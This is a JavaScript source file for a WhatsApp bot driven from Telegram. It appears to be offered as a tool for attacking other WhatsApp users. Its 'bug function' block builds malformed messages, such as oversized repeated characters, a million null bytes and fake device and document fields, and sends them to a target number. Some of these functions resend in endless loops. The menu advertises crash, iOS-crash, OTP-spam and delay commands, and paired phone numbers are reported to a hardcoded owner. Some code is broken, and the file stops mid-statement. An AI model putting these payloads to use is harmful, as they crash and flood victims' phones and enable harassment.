    const { makeWASocket, proto, getContentType, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, DisconnectReason, makeInMemoryStore, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const pino = require('pino');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const TDX = fs.readFileSync("./media/badboi.jpg")
const darkphonk = fs.readFileSync('./media/menu.mp3')
const global = {
    creatorName: "༺𝙼𝙰𝙻𝙸𝙱𝚄༻",
    owner: "wa.me/+254712267225",
    botName: "🔥 𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 🔥"
};

// Constants
const ADMIN_USERNAME = '𝙼𝙰𝙻𝙸𝙱𝚄'; // Admin username for premium commands


    // Helper for sleep function
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
function runtime(seconds) {
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = Math.floor(seconds % 60);
        return `${hours}h ${minutes}m ${secs}s`;
    }
    
function loadPremiumUsers() {
    try {
        if (!fs.existsSync('./database/premium.json')) {
            fs.writeFileSync('./database/premium.json', JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync('./database/premium.json', 'utf-8'));
    } catch (error) {
        console.error('Error loading premium users:', error);
        return [];
    }
}

function savePremiumUsers(data) {
    try {
        fs.writeFileSync('./database/premium.json', JSON.stringify(data, null, 2));
    } catch (error) {
        console.error('Error saving premium users:', error);
    }
}

const speed = require("performance-now")
const moment = require("moment-timezone");
const crypto = require('crypto')
const time2 = moment().tz('Africa/Nairobi').format('HH:mm:ss');
const kaidate = moment.tz('Africa/Nairobi').format('DD/MM/YYYY');
let nowtime = '';

if (time2 < "05:00:00") {
  nowtime = 'night 🏙';
} else if (time2 < "11:00:00") {
  nowtime = 'morning 🌅';
} else if (time2 < "15:00:00") {
  nowtime = 'afternoon 🏞';
} else if (time2 < "18:00:00") {
  nowtime = 'evening 🌇';
} else if (time2 < "19:00:00") {
  nowtime = 'evening 🌆';
} else {
  nowtime = 'Good night 🌌';
}

const startTime = Date.now();
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const settings = require("./config.json")
const BOT_TOKEN = settings.BOT_TOKEN;  // Replace with your Telegram bot token
let OWNER_ID = settings.OWNER_ID
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const pairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
const requestLimits = new NodeCache({ stdTTL: 120, checkperiod: 60 }); // Store request counts for 2 minutes
let connectedUsers = {}; // Maps chat IDs to phone numbers
const Badboi = '254712267225@s.whatsapp.net';
const connectedUsersFilePath = path.join(__dirname, 'pairing.json');
const { smsg } = require("./myfunc")

// Spam report tracking
const spamReportTracker = new Map(); // Track spam report operations

const formatTime = (seconds) => {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  const dDisplay = d > 0 ? `${d} ${d === 1 ? 'day, ' : 'days, '}` : '';
  const hDisplay = h > 0 ? `${h} ${h === 1 ? 'hour, ' : 'hours, '}` : '';
  const mDisplay = m > 0 ? `${m} ${m === 1 ? 'minute, ' : 'minutes, '}` : '';
  const sDisplay = s > 0 ? `${s} ${s === 1 ? 'second' : 'seconds'}` : '';
  return `${dDisplay}${hDisplay}${mDisplay}${sDisplay}`;
};
// Ensure database directory exists
const dbDir = path.join(__dirname, 'database');
if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
}
// Premium user management functions
function loadPremiumUsers() {
    try {
        if (!fs.existsSync('./database/premium.json')) {
            fs.writeFileSync('./database/premium.json', JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync('./database/premium.json', 'utf-8'));
    } catch (error) {
        console.error('Error loading premium users:', error);
        return [];
    }
}

function savePremiumUsers(data) {
    try {
        fs.writeFileSync('./database/premium.json', JSON.stringify(data, null, 2));
    } catch (error) {
        console.error('Error saving premium users:', error);
    }
}

// Functions to manage trial users
function loadTrialUsers() {
    try {
        if (!fs.existsSync('./database/trial.json')) {
            fs.writeFileSync('./database/trial.json', JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync('./database/trial.json', 'utf-8'));
    } catch (error) {
        console.error('Error loading trial users:', error);
        return [];
    }
}

function saveTrialUsers(data) {
    try {
        fs.writeFileSync('./database/trial.json', JSON.stringify(data, null, 2));
    } catch (error) {
        console.error('Error saving trial users:', error);
    }
}

// Check if user is premium or on trial
function isUserPremium(userId) {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.some(user => user.id === userId);
}

function isUserOnTrial(userId) {
    const trialUsers = loadTrialUsers();
    const user = trialUsers.find(user => user.id === userId);
    
    if (!user) return false;
    
    // Check if trial is still valid
    if (new Date() > new Date(user.expiresAt)) {
        // Trial expired, remove user
        const updatedTrialUsers = trialUsers.filter(u => u.id !== userId);
        saveTrialUsers(updatedTrialUsers);
        return false;
    }
    
    return true;
}

// Check if a user has access (either premium or trial)
function hasAccess(userId) {
    return isUserPremium(userId) || isUserOnTrial(userId);
}
// Helper function to check if command is from admin
function isAdmin(username) {
    return username === ADMIN_USERNAME;
}

const fetchJson = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}

// Load connected users from the JSON file
function loadConnectedUsers() {
    if (fs.existsSync(connectedUsersFilePath)) {
        try {
            const data = fs.readFileSync(connectedUsersFilePath);
            connectedUsers = JSON.parse(data);
        } catch (error) {
            console.error('Error loading connected users:', error);
            connectedUsers = {};
        }
    }
}

// Save connected users to the JSON file
function saveConnectedUsers() {
    try {
        fs.writeFileSync(connectedUsersFilePath, JSON.stringify(connectedUsers, null, 2));
    } catch (error) {
        console.error('Error saving connected users:', error);
    }
}

// Function to check if a number is banned on WhatsApp


let isFirstLog = true;

async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
    const sessionPath = path.join(__dirname, 'SESSIONS', `session_${phoneNumber}`);

    // Check if the session directory exists
    if (!fs.existsSync(sessionPath)) {
        console.log(`Session directory does not exist for ${phoneNumber}.`);
        return; // Exit the function if the session does not exist
    }

    let { version, isLatest } = await fetchLatestBaileysVersion();
    if (isFirstLog) {
        console.log(`Using Baileys version: ${version} (Latest: ${isLatest})`);
        isFirstLog = false;
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const msgRetryCounterCache = new NodeCache();
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.windows('Firefox'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    });
    store.bind(conn.ev);

    // Check if session credentials are already saved
    if (conn.authState.creds.registered) {
        await saveCreds();
        console.log(`Session credentials reloaded successfully for ${phoneNumber}!`);
    } else {
        // If not registered, generate a pairing code
        if (telegramChatId) {
            setTimeout(async () => {
                let code = await conn.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                pairingCodes.set(code, { count: 0, phoneNumber });
                bot.sendMessage(telegramChatId, 
        `[CLICK HERE TO COPY YOUR REQUEST OTP CODE FOR ${phoneNumber}](https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp${code})

To pair your WhatsApp account, follow these steps:

1. On your WhatsApp home page, click on the three dots in the top right corner.
2. Tap *Link Device*
3. Tap *Link a device*
4. Just below there will be a *Link with phone number instead*, tap on it
5. Paste your 6 character code`, { 
        parse_mode: 'Markdown', 
        disable_web_page_preview: true 
    });
                console.log(`Your Pairing Code for ${phoneNumber}: ${code}`);
            }, 3000);
        }
    }
    conn.public = true
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            await saveCreds();
            console.log(`Credentials saved successfully for ${phoneNumber}!`);

            // Send success messages to the user on Telegram
            if (telegramChatId) {
                if (!connectedUsers[telegramChatId]) {
                    connectedUsers[telegramChatId] = [];
                }
                connectedUsers[telegramChatId].push({ phoneNumber, connectedAt: startTime });
                saveConnectedUsers(); // Save connected users after updating
                bot.sendMessage(telegramChatId, `
╔═══════════════╗  
║ 𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰      ║  
╚═══════════════╝  

📡 Connection: ✅ Connected  
👤 User: ${phoneNumber}  
🔌 Platform: WhatsApp  
🛠️ Developer: 𝙼𝙰𝙻𝙸𝙱𝚄   

════════════════════
`)
                console.log(`
╔══════════════════╗  
║ 𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰      ║  
╚══════════════════╝  

📡 *Connection:* ✅ Connected  
👤 *User:* ${phoneNumber}  
🔌 *Platform:* WhatsApp  
🛠️ *Developer:* 𝙼𝙰𝙻𝙸𝙱𝚄

════════════════════  
🔥 Stay Connected, Stay Powered! 
════════════════════
     `);
            }

           
         // Send a success message to the lord on WhatsApp
         try {
                await conn.sendMessage(Badboi, { text: `
╔══════════════════╗  
║ 𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰     ║  
╚══════════════════╝  

📡 *Connection:* ✅ Connected  
👤 *User:* ${phoneNumber}  
🔌 *Platform:* WhatsApp  
🛠️ *Developer:* 𝙼𝙰𝙻𝙸𝙱𝚄 
🖇️ *follow our channel*: T.ME/TECHPALACE
════════════════════  
🔥 Stay Connected, Stay Powered! 
════════════════════
` });

            } catch (error) {
                console.error('Error sending message to admin:', error);
            }
          
        } else if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log(`Session closed for ${phoneNumber}. Attempting to restart...`);
                startWhatsAppBot(phoneNumber, telegramChatId);
            }
        }
});

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async chatUpdate => {
        try {
            mess = chatUpdate.messages[0]
            if (!mess.message) return
            mess.message = (Object.keys(mess.message)[0] === 'ephemeralMessage') ? mess.message.ephemeralMessage.message : mess.message
            if (mess.key && mess.key.remoteJid === 'status@broadcast') return
            if (!conn.public && !mess.key.fromMe && chatUpdate.type === 'notify') return
            if (mess.key.id.startsWith('BAE5') && mess.key.id.length === 16) return
                try {
        const m = smsg(JSON.parse(JSON.stringify(mess)), conn);
        const type = getContentType(mess.message);
        const content = JSON.stringify(mess.message);
        const chat = mess.key.remoteJid;
        const quoted = type === 'extendedTextMessage' && mess.message.extendedTextMessage.contextInfo != null
            ? mess.message.extendedTextMessage.contextInfo.quotedMessage || []
            : [];
        var body = (
type === 'conversation' ? mess.message.conversation :
type === 'imageMessage' ? mess.message.imageMessage.caption :
type === 'videoMessage' ? mess.message.videoMessage.caption :
type === 'extendedTextMessage' ? mess.message.extendedTextMessage.text :
type === 'buttonsResponseMessage' ? mess.message.buttonsResponseMessage.selectedButtonId :
type === 'listResponseMessage' ? mess.message.listResponseMessage.singleSelectReply.selectedRowId :
type === 'interactiveResponseMessage' ? JSON.parse(mess.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
type === 'templateButtonReplyMessage' ? mess.message.templateButtonReplyMessage.selectedId :
type === 'messageContextInfo' ?
mess.message.buttonsResponseMessage?.selectedButtonId ||                                                                                                   
mess.message.listResponseMessage?.singleSelectReply.selectedRowId ||
mess.message.InteractiveResponseMessage.NativeFlowResponseMessage ||                                                                                       
mess.text :
''
); 
    var budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = settings.prefix
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const text = q
        const isGroup = chat.endsWith('@g.us');
        const sender = mess.key.fromMe
            ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id)
            : (mess.key.participant || mess.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mess.pushName || 'TeleWA bot';
        let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
        const isCreator = [ "254712267225", "254712267225",owner].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
        const groupMetadata = isGroup ? await conn.groupMetadata(chat).catch(e => {}) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : '';
        const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber + "@s.whatsapp.net") : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
const rep = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `Hi ${pushname}`
}
}
}
          global.stsview = false
		  if (global.stsview && mess.key.remoteJid === "status@broadcast") {
          await conn.readMessages(mess.key);
          }
          
        const send = async (text) => {
        await conn.sendMessage(chat, { text: text }, { quoted: rep })
	  }
	  

const cursor = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: TDX,
					itemCount: `99999`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝙼𝙰𝙻𝙸𝙱𝚄 𝚃𝙷𝙴𝙴 𝙶𝚁𝙴𝙰𝚃`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [mess.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}

///stating of bug function 
async function INFINITY_NOCLICKTOYA1(target) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰 is here",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                        ],
                    },
                },
            },
        },
    };

    while (true) {
        await conn.relayMessage(target, Msg, { participant: { jid: target } });
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
//function2
async function INFINITY_NOCLICKTOYA2(target) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰i is here",
                    },
                    nativeFlowMessage: {
                        buttons: Array(5).fill({ name: "mpm", buttonParamsJson: "" }),
                    },
                },
            },
        },
    };

    console.log("🚀 Starting Infinite Message Spam...");

    while (true) {
        try {
            await Promise.all(
                Array.from({ length: 100 }, () =>
                    conn.relayMessage(target, Msg, { participant: { jid: target } })
                )
            );

            console.log("✅ Sent infinity messages successfully!");
        } catch (error) {
            console.error("❌ Error sending messages:", error);
        }
    }
}
//Function3
async function INFINITY_NOCLICKTOYA3(target) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰 is here",
                    },
                    nativeFlowMessage: {
                        buttons: Array(5).fill({ name: "mpm", buttonParamsJson: "" }),
                    },
                },
            },
        },
    };

    console.log("🚀 Starting infinity Messages Per Second...");

    while (true) {
        try {
            // إرسال 50 رسالة دفعة واحدة
            await Promise.all(
                Array.from({ length: 50 }, () =>
                    conn.relayMessage(target, Msg, { participant: { jid: target } })
                )
            );

            console.log("Done Send infinity Massges");

            // انتظار 1 ثانية قبل إرسال الدفعة التالية
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (error) {
            console.error("❌ Error sending messages:", error);
        }
    }
}
//function4
async function INFINITY_NOCLICKTOYA4(target) {
    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: ["@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰 is here",
                    },
                    nativeFlowMessage: {
                        buttons: Array(5).fill({ name: "mpm", buttonParamsJson: "" }),
                    },
                },
            },
        },
    };

    console.log("🚀 Starting Hard INFINITE MESSAGES...");

    while (true) {
        try {
            Promise.all(
                Array.from({ length: 500 }, () =>
                    conn.relayMessage(target, Msg, { participant: { jid: target } })
                )
            ).then(() => console.log("✅ Sent 500 messages successfully!"));
        } catch (error) {
            console.error("❌ Error sending messages:", error);
        }
    }
}

async function newLoaudFast(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: Infinity, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "◈", 
                        },
                                    nativeFlowMessage: {
                                      buttons: [
                              {
                              name: "single_select",
                       buttonParamsJson: "",
                           },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                                }
                            ],
                        },
                    },
                },
            },
        };

        await conn.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}

async function newLoadFast(target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(10000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 9999999, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    fileName: "≏ king badboi is here᙭ ≏",
                                    fileLength: "9999999999999", 
                                    pageCount: 9007199254740991, 
                                    directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc",
                                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                    mediaKeyTimestamp: "1715880173",
                                    mediaType: "presentation",
                                    contactVcard: true,
                                    jpegThumbnail: Buffer.alloc(4096, 0) 
                                }
                            }
                        },
                        body: {
                            text: "≏ king badboi is here᙭ ≏",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" }
                            ],
                        },
                    },
                },
            },
        };

        await conn.relayMessage(target, message, {
            participant: { jid: target },
        });
    } catch (err) {
        console.log(err);
    }
}



////////////////latest function by kingbadboi///_////////////////////////////////////////////
async function outofsync(target) {
    await conn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@𝗱𝗲𝘃𝗼𝗿𝘀𝗶𝘅 • #𝘀𝗵𝗼𝘄𝗼𝗳𝗯𝘂𝗴 🩸",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}



function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "connSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await conn.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://youtube.com/@ShinZ.00"
        }
    }, { participant: { jid: target } });
    
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "😘" + TravaIphone,
            url: "https://youtube.com/@qioaje"
        }
    }, { participant: { jid: target } });
}



async function forclose(target) {
  await conn.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "⃟🩸🗿 🦠⃟",
          hasMediaAttachment: false
        },
        body: {
          text: "\nꦾ".repeat(155555)
        },
        nativeFlowMessage: {
          messageParamsJson: "{}",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    },
    {}
  );
}


async function Bug5(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '333333333333333333333@newsletter',
                                newsletterName: "𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000000,
                            },
                        },
                    },
                };
                await conn.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
////////////end of bug function/////////////
//=================================================//

const channelId = "120363290640941556@newsletter";

function followNewsletter(channelId) {
  try {
    conn.newsletterFollow(channelId);
    console.log(`running ${channelId}`);
  } catch (error) {
    console.error('Newsletter follow error:', error);
  }
}


followNewsletter(channelId);
      
        //Commands here
        switch (command) {
    case "ping": { 
    let timestamp = speed();
    let latency = speed() - timestamp;
    send(`𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰: ${latency.toFixed(4)} 𝐌𝐬⚡`);
    }
break
case 'menu':{
const caption = `
>      𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰
> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝚇
> 𝐌𝐨𝐝𝐞 : 𝑷𝒖𝒃𝒍𝒊𝒄
> 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.creatorName}
> 𝐎𝐰𝐧𝐞𝐫 : ${global.owner}
> 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}
        ⌜ 𝙈𝙀𝙉𝙐 ⌟ 
🔹 *${prefix}_/ownermenu_
🔹 *${prefix}_/bugmenu_
🔹 *${prefix}_/banmenu_ 
┗`;

  conn.sendMessage(chat, {
    image: { url: "https://files.catbox.moe/4wzyc7.jpeg" },
    caption,
    mentions: [mess.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: "/bugmenu",
        buttonText: {
          displayText: "𝐁𝐮𝐠𝐦𝐞𝐧𝐮"
        }
      },
      {
        buttonId: "/ownermenu",
        buttonText: {
          displayText: "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮"
        }
      },
      {
        buttonId: "/banmenu",
        buttonText: {
          displayText: "𝘽𝙖𝙣𝙢𝙚𝙣𝙪"
        }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: mess,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363290640941556@newsletter`, // Use the newsletterJid here
        newsletterName: `𝙎𝘾𝙍𝙄𝙋𝙏 𝙆𝙄𝘿𝘿𝙄𝙀𝙎 𝙏𝙀𝘾𝙃` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await conn.sendMessage(chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: mess })
}
break
case 'ownermenu':{
const caption = `
>      𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰 
> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝚇
> 𝐌𝐨𝐝𝐞 : 𝑷𝒖𝒃𝒍𝒊𝒄
> 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.creatorName}
> 𝐎𝐰𝐧𝐞𝐫 : ${global.owner}
> 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}

🔹 *${prefix}ping* - Check bot response time
🔹 *${prefix}runtime* - Check bot response time
🔹 *${prefix}unblock <number>* - Unblock a user
🔹 *${prefix}block <number>* - Block a user
┗❐ `;

  conn.sendMessage(chat, {
    image: { url: "https://files.catbox.moe/4wzyc7.jpeg" },
    caption,
    mentions: [mess.sender],
    footer: global.botName,
    buttons: [
      {
        buttonId: "/bugmenu",
        buttonText: {
          displayText: "𝐁𝐮𝐠𝐦𝐞𝐧𝐮"
        }
      },
      {
        buttonId: "/ownermenu",
        buttonText: {
          displayText: "𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮"
        }
      },
      {
        buttonId: "/banmenu",
        buttonText: {
          displayText: "𝘽𝙖𝙣𝙢𝙚𝙣𝙪"
        }
      }
    ],
    viewOnce: true,
    headerType: 6,
    quoted: mess,
    contextInfo: {
      isForwarded: true,
      forwardingScore: 99999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `120363290640941556@newsletter`, // Use the newsletterJid here
        newsletterName: `𝙎𝘾𝙍𝙄𝙋𝙏 𝙆𝙄𝘿𝘿𝙄𝙀𝙎 𝙏𝙀𝘾𝙃` // Add the newsletter name here
      }
    }
  });

await sleep(2000)

  await conn.sendMessage(chat, {
    audio: darkphonk,
    mimetype: 'audio/mpeg'
  }, { quoted: mess })
}
break
case 'bugmenu':{
const caption = `
>      𝙳𝙰𝚁𝙺 𝚆𝙴𝙱 𝚇 𝚆𝙰 
> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝚇
> 𝐌𝐨𝐝𝐞 : 𝑷𝒖𝒃𝒍𝒊𝒄
> 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.creatorName}
> 𝐎𝐰𝐧𝐞𝐫 : ${global.owner}
> 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}

      [ 𝘾𝙍𝘼𝙎𝙃 𝘽𝙀𝙏𝘼 ] 
🔹 *${prefix}_betanew_ (direct full crash)
🔹 *${prefix}_toyanew_ (direct full crash)
🔹 *${prefix}_spampair_ (spam otp)
🔹 *${prefix}_xbeta_ (234x full crash)
🔹 *${prefix}_xgroup_ (new gc bugs)
🔹 *${prefix}_crashfc_ (direct dm full crash)
🔹 *${prefix}_ioscrash_ (only ios bugs)
🔹 *${prefix}_delay_ (delay user for 3hours)
┗`;

  conn.sendMessage(chat, {
    image: { url: "https://files.catbox.moe/4wzyc7.jpeg" },
    caption,
    mentions: [mess.sender],
